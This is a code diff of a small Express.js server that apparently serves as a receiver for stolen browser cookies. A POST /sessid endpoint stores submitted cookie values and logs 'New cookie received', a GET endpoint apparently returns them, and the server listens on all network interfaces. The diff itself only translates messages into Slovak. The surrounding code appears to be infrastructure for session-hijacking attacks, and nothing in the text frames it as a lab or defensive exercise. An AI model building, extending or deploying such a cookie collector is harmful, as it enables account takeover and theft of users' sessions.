@@ -15,7 +15,7 @@ app.post("/sessid", (req, res) => {
   const { cookie, value, timestamp } = req.body;
 
   if (!cookie || !value) {
-    return res.status(400).json({ error: "Invalid payload" });
+    return res.status(400).json({ error: "Neplatný payload" });
   }
 
   sessions[cookie] = {
@@ -23,7 +23,7 @@ app.post("/sessid", (req, res) => {
     timestamp
   };
 
-  console.log("New cookie received:", cookie, value);
+  console.log("Nove cookie:", cookie, value);
   res.sendStatus(200);
 });
 
@@ -34,5 +34,5 @@ app.get("/sessid", (req, res) => {
 
 // Spustenie servera na všetkých sieťových rozhraniach
 app.listen(3000, "0.0.0.0", () => {
-  console.log("Listening on 0.0.0.0:3000");
+  console.log("Pocuvam na 0.0.0.0:3000");
 });
